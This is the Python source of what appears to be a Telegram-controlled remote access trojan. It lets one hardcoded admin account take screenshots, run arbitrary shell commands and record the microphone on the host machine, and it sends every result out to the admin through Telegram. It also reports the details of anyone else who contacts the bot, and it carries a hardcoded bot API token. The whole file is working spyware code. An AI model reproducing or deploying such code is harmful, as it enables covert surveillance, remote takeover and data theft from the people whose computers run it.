import subprocess
import pyautogui
import telebot
import pyaudio
import wave
import cv2

# Data
API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
ADMIN = 804011643

bot = telebot.TeleBot(API_TOKEN)

cmd = """
Commands:
-| /start

-| /screenshot

-| /execute_command

-| /micro_recording

-| /screen_recording

"""

# Fn
def record(time=6):
    filename = "recorded.wav"

    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    for i in range(int(44100 / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)
        
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False

# Work
@bot.message_handler(commands=["start", "help"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN, cmd)

@bot.message_handler(commands=["screenshot"])
def screenshot(ms):
    if checkID(ms):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("screenshot.jpg")
        
        with open("screenshot.jpg", "rb") as photo:
            bot.send_photo(ADMIN, photo)

@bot.message_handler(commands=["execute_command"])
def execute_command_first(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter command...")
        
        @bot.message_handler(content_types=["text"])
        def execute_command_last(ms):
            try:
                cmd = ms.text
                output = subprocess.check_output(cmd, shell=True).decode("utf-8")
                print(output)
                bot.send_message(ADMIN, f"Output:\n{output}")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")
        
        bot.register_next_step_handler(ms, execute_command_last)

@bot.message_handler(commands=["micro_recording"])
def micro_recording_first(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter time, quantity iteration...")
        
        @bot.message_handler(content_types=["text"])
        def micro_recording_last(ms):
            try:
                list_data = ms.text.split(" ")
                time = int(list_data[0])
                quantity = int(list_data[1])
                bot.send_message(ADMIN, "Recording...")
                
                for i in range(quantity):
                    record(time)
                    with open("recorded.wav", 'rb') as audio:
                        bot.send_audio(ADMIN, audio)
                
                bot.send_message(ADMIN, "Finished recording.")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, micro_recording_last)

bot.infinity_polling()